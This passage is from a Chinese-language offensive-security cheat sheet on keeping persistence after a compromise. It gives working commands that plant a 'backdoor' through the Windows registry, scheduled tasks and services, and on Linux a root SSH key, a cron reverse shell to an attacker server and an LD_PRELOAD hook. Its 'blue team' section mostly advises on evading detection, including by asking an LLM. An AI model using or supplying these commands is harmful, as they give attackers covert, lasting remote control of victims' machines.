## 九、权限维持

### 9.1 Windows持久化
```
# 用户态: 注册表Run键 / 计划任务 / 启动文件夹 / WMI事件订阅 / DLL劫持
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "C:\backdoor.exe" /f
schtasks /create /tn backdoor /tr C:\backdoor.exe /sc onlogon /ru SYSTEM /f
# 服务持久化(删除普通用户访问权限)
sc create backdoor binPath= C:\backdoor.exe start= auto
# 系统态: 服务/驱动(以SYSTEM权限,隐蔽)
# 域持久化: 黄金票据 / 域管账户克隆(ACL DCSync) / Skeleton Key / SSP
# 工具: SharpPersist / PoshC2持久化模块 / 内存马(Web场景)
```

### 9.2 Linux持久化
```
# SSH后门: 公钥写入 / 修改authorized_keys / PAM后门
cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
# 计划任务/Cron反弹
(crontab -l; echo "*/5 * * * * bash -i >& /dev/tcp/<vps>/4444 0>&1") | crontab -
# 系统服务/init.d / 隐藏进程(进程名伪装成常见服务)
# 内核级: rootkit(LKM)/LD_PRELOAD后门
echo 'export LD_PRELOAD=/tmp/evil.so' > /etc/ld.so.preload
```

### 9.3 持久化对抗（蓝队视角自检）
```
- 持久化优先级: 域级(金票/ACL) > 系统级(服务/驱动) > 用户级(计划任务)
- 隐蔽性: 注册表Run易被发现 → 用WMI事件/服务DLL/内存马
- 清理风险: 先确认清理影响面,避免留下"删一半"痕迹
- AI辅助: 让LLM评估持久化方案的检测暴露面(ETW/事件ID/Sysmon规则)
```

